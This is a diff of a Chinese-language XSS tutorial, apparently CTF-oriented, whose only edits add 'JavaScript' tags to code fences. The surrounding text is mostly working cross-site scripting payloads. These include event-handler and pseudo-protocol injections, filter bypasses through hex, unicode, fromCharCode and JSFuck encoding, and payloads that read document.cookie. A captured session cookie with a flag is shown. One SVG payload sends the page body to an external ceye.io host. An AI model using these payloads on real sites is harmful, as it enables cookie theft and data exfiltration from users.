@@ -75,7 +75,7 @@ XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading
 
 判断<>/是否被过滤。如果没有，那么直接插入就可以。
 
-```
+```JavaScript
 <script>
 [output]
 </script>
@@ -122,7 +122,7 @@ urlencode 版本： <a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%
 
  插入合乎逻辑的JS代码即可。也可以使用伪协议。
 
-```
+```JavaScript
 onload 
 onclick
 onunload 
@@ -167,7 +167,7 @@ ondrop
 单引号及双引号被过滤情况：`<script>alert(/jdq/)</script> //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显`
  **javascript伪协议：**
 
-```
+```JavaScript
 <a href="javascript:alert(/test/)">xss</a>
 <iframe src=javascript:alert('xss');height=0 width=0 /><iframe>利用iframe框架标签
 ```
@@ -180,7 +180,7 @@ ondrop
 
 **括号被过滤,可以使用throw来抛出数据**
 
-```
+```JavaScript
 <a onmouseover="javascript:window.onerror=alert;throw 1">2</a>
 <img src=x onerror="javascript:window.onerror=alert;throw 1">
 <body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
@@ -198,7 +198,7 @@ ondrop
 
 无法使用href：
 
-```
+```JavaScript
 <a onmouseover="alert(document.cookie)">xxs link</a>
 在chrome下，其回补全缺失的引号。因此，也可以这样写：
 <a onmouseover=alert(document.cookie)>xxs link</a>
@@ -209,27 +209,27 @@ ondrop
 JS函数（如eval，settimeout）还有就是`href= action= formaction= location= on*= name= background= poster= src= code=`这些地方，可以配合编码。此外，data属性可以base64编码。
  1.js16进制
 
-```
+```JavaScript
 <script>eval(“js+16进制加密”)</script> <script>eval("\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29")</script> 编码要执行的语句↓
 Alert(“xss”)
 ```
 
 2.js unicode
 
-```
+```JavaScript
 <script>eval("unicode加密")</script> //js unicode加密 解决alert()被过滤
 <script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script>
 ```
 
 3.String.fromCharCode函数（不需要任何引号，必须函数内）
 
-```
+```JavaScript
 <script>eval(String.fromCharCode编码内容))</script> <script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>
 ```
 
 4.jsfuck版本
 
-```
+```JavaScript
 <script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>
 ```
 
@@ -366,7 +366,7 @@ PHPSESSID=9crkuhdqs9b1jkslebpieprr86; FLAG_XSSME=FLAG{Sometimes, XSS can be crit
 
 xss去本地访问，再将页面内容打出来
 
-```
+```JavaScript
 <svg/onload="document.location='http://ugelgr.ceye.io/?'+btoa(document.body.innerHTML)">
 ```
 
